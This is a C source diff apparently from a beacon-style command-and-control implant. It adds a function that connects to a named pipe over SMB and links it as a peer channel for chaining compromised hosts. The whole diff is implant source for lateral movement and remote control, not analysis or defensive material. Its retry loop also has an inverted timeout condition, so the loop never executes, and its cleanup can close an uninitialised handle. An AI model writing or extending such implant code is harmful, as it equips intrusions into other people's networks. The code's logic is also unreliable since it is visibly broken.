@@ -2,6 +2,7 @@
 
 #include "protocol.h"
 
+#include "link.h"
 #include "beacon.h"
 #include "settings.h"
 
@@ -219,4 +220,58 @@ PROTOCOL* ProtocolTcpInit(PROTOCOL* protocol, SOCKET socket)
 	protocol->flush = NULL;
 	protocol->waitForData = ProtocolTcpWaitForData;
 	return protocol;
+}
+
+void ProtocolSmbOpenExplicit(char* data)
+{
+	int timeout = GetTickCount() + 15000;
+	HANDLE file;
+	while (timeout < GetTickCount())
+	{
+		file = CreateFileA(data, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
+		if (file != INVALID_HANDLE_VALUE)
+		{
+			int mode = PIPE_READMODE_MESSAGE;
+			if (!SetNamedPipeHandleState(file, &mode, NULL, NULL))
+			{
+				DWORD lastError = GetLastError();
+				LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
+				BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
+				goto cleanup;
+			}
+
+			PROTOCOL protocol;
+			ProtocolSmbInit(&protocol, file);
+			int port = 445;
+			if (!LinkAdd(&protocol, port))
+				goto cleanup;
+
+			return;
+		}
+
+		if (GetLastError() == ERROR_PIPE_BUSY)
+		{
+			WaitNamedPipeA(data, 10000);
+		}
+		else
+		{
+			Sleep(1000);
+		}
+	}
+
+	DWORD lastError = GetLastError();
+	if (lastError == ERROR_SEM_TIMEOUT)
+	{
+		LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorNA(ERROR_CONNECT_TO_PIPE_TIMEOUT);
+	}
+	else
+	{
+		LERROR("Could not connect to pipe: %s", LAST_ERROR_STR(lastError));
+		BeaconErrorD(ERROR_CONNECT_TO_PIPE_FAILED, lastError);
+	}
+
+	cleanup:
+		DisconnectNamedPipe(file);
+		CloseHandle(file);
 }
